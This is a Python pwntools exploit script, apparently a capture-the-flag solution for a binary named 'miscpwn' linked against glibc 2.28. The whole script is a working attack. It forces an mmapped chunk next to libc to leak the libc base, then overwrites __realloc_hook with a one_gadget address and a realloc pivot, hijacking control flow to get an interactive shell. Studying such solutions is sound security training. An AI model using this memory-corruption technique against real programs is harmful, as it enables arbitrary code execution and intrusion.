from pwn import *
import os


basedir = os.path.abspath(os.path.dirname(__file__))

env = {
    'LD_PRELOAD': os.path.join(basedir, 'libc.so.6')
}

p = process(['./ld-2.28.so', './miscpwn'], env=env)
gdb.attach(p, 'b *0x7ffff7c3020d')

# if we give a size large enough to malloc, it will call mmap
# giving 10000000 as input gave a chunk aligned to libc
# now we have both chance to write to libc and a libc leak
p.sendlineafter("malloc:\n", "10000000")
leak = int(p.recvline()[:-1], 16)
libc_base = leak + 0x989ff0
log.info("Libc: 0x{:x}".format(libc_base))
# malloc_hook = libc_base + 0x1e4c30
realloc_hook = libc_base + 0x1e4c28
offset = realloc_hook - leak
p.sendlineafter("Offset:\n", hex(offset))
one_gadget = libc_base + 0x501e3
realloc = libc_base + 0x965be
p.sendafter("Data:\n", p64(one_gadget) + p64(realloc))
p.interactive()
